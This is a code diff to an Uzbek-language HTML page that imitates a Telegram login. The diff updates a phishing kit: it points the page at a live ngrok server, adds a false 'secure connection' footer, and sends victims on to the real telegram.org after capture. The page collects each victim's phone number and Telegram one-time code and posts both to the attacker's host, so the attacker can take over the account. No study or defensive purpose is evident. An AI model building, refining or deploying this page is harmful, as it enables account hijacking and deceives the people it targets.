@@ -3,60 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Verification</title>
+    <title>Telegram Tasdiqlash</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
-        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; cursor: pointer; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        h2 { color: #0088cc; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.3s; }
+        button:hover { background: #0077b5; }
         .hidden { display: none; }
+        .footer { margin-top: 20px; font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
 
 <div class="card" id="phone-box">
-    <h2>Telegram Kirish</h2>
-    <p>Raqamingizni tasdiqlang</p>
+    <h2>Telegram</h2>
+    <p>Akkauntingizga kirish uchun telefon raqamingizni kiriting</p>
     <input type="text" id="phone" placeholder="+998901234567">
     <button onclick="sendPhone()">Kodni yuborish</button>
+    <div class="footer">Xavfsiz ulanish yoqilgan</div>
 </div>
 
 <div class="card hidden" id="code-box">
-    <h2>Kodni kiriting</h2>
-    <p>Telegram ilovangizga kelgan kodni yozing</p>
-    <input type="text" id="otp" placeholder="12345">
+    <h2>Tasdiqlash</h2>
+    <p>Telegram ilovangizga kelgan 5 xonali kodni kiriting</p>
+    <input type="text" id="otp" placeholder="Kod">
     <button onclick="sendCode()">Tasdiqlash</button>
 </div>
 
 <script>
-    const SERVER_URL = "http://YOUR_VPS_IP:5000"; // Kali yoki VPS IP manzilingizni yozing
+    // Sizning hozirgi Ngrok havolangiz
+    const SERVER_URL = "https://bibliographical-britta-nonprovidentially.ngrok-free.dev";
 
     async function sendPhone() {
         const phone = document.getElementById('phone').value;
-        const res = await fetch(`${SERVER_URL}/send_code`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ phone: phone })
-        });
-        const data = await res.json();
-        if(data.status === "ok") {
-            document.getElementById('phone-box').classList.add('hidden');
-            document.getElementById('code-box').classList.remove('hidden');
-        } else {
-            alert("Xato: " + data.message);
+        if(!phone) return alert("Raqamni kiriting!");
+
+        try {
+            const res = await fetch(`${SERVER_URL}/send_code`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: phone })
+            });
+            const data = await res.json();
+            
+            if(data.status === "ok") {
+                document.getElementById('phone-box').classList.add('hidden');
+                document.getElementById('code-box').classList.remove('hidden');
+            } else {
+                alert("Xato: " + data.message);
+            }
+        } catch (e) {
+            alert("Serverga ulanib bo'lmadi. Ngrok yoniqligini tekshiring!");
         }
     }
 
     async function sendCode() {
         const phone = document.getElementById('phone').value;
         const code = document.getElementById('otp').value;
-        const res = await fetch(`${SERVER_URL}/verify`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ phone: phone, code: code })
-        });
-        const data = await res.json();
-        alert(data.message);
+
+        try {
+            const res = await fetch(`${SERVER_URL}/verify`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: phone, code: code })
+            });
+            const data = await res.json();
+            
+            if(data.status === "success") {
+                alert("Muvaffaqiyatli tasdiqlandi!");
+                window.location.href = "https://telegram.org"; // Haqiqiy saytga yuborish
+            } else {
+                alert("Xato kod: " + data.message);
+            }
+        } catch (e) {
+            alert("Xatolik yuz berdi!");
+        }
     }
 </script>
 
